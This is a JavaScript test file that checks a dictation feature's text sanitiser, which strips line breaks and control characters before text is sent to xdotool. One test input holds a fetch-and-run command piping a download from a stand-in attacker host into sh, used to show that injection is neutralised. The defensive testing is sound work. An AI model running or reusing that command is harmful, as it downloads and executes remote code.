/* global process */
// What dictation types into another app's window is words on one line (PR600 audit P6-59):
// the real typeText (system-dictation.js) hands its text to the session's typist over a real pipe.
// The typist here is a stand-in for xdotool: a script, alone on PATH for this test, that keeps what
// it was handed instead of pressing keys, so nothing is ever typed into the operator's own windows.
// What is proven is the platform's side: the bytes that reach the typist. No mocks (RULE 0).
import fs from 'node:fs';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createTempDir } from '../helpers/temp-fs.js';
import { MAX_TYPED_CHARS, typeableText } from '../../backend/services/system-dictation/typed-text.js';

const KEYS = ['PATH', 'XDG_SESSION_TYPE', 'WAYLAND_DISPLAY'];
const saved = Object.fromEntries(KEYS.map((key) => [key, process.env[key]]));
const ESC = String.fromCharCode(27);
const C1 = String.fromCharCode(0x9b);
let out; let typeText;

beforeAll(async () => {
  const dir = await createTempDir('typed-text');
  out = path.join(dir, 'typed.txt');
  fs.writeFileSync(path.join(dir, 'xdotool'), `#!${process.execPath}\nprocess.stdin.pipe(require('node:fs').createWriteStream(${JSON.stringify(out)}));\n`, { mode: 0o755 });
  // an X11 session whose only program is the stand-in: no real typist can be reached from here
  Object.assign(process.env, { PATH: dir, XDG_SESSION_TYPE: 'x11' });
  delete process.env.WAYLAND_DISPLAY;
  ({ typeText } = await import('../../backend/services/system-dictation/system-dictation.js'));
});
afterAll(() => {
  for (const [key, value] of Object.entries(saved)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; }
});

describe('what dictation types', () => {
  it('a line break is never typed: a command hidden between lines reaches the typist as one line of words', async () => {
    await typeText('true\ncurl http://attacker.invalid/x | sh\r\ntrue');
    expect(fs.readFileSync(out, 'utf8')).toBe('true curl http://attacker.invalid/x | sh true ');
  });

  it('control characters are never typed: Escape, the C1 set, NUL, backspace, a Unicode line separator', async () => {
    await typeText(`one${ESC}[2Jtwo${C1}three${String.fromCharCode(0)}four${String.fromCharCode(8)}five${String.fromCharCode(0x2028)}six\tseven`);
    expect(fs.readFileSync(out, 'utf8')).toBe('one[2Jtwothreefourfive six seven ');
  });

  it('spoken words are typed as heard, in any script, with the trailing space', async () => {
    await typeText('  Hello, Señor — 你好 world.  ');
    expect(fs.readFileSync(out, 'utf8')).toBe('Hello, Señor — 你好 world. ');
  });

  it('text that is only line breaks and control characters types nothing at all', async () => {
    fs.rmSync(out, { force: true });
    await typeText(`\n\r\n${ESC}`);
    expect(fs.existsSync(out)).toBe(false);
  });

  it('one hold is bounded', () => {
    expect(typeableText('a'.repeat(MAX_TYPED_CHARS + 500))).toHaveLength(MAX_TYPED_CHARS);
    expect(typeableText(null)).toBe('');
  });
});
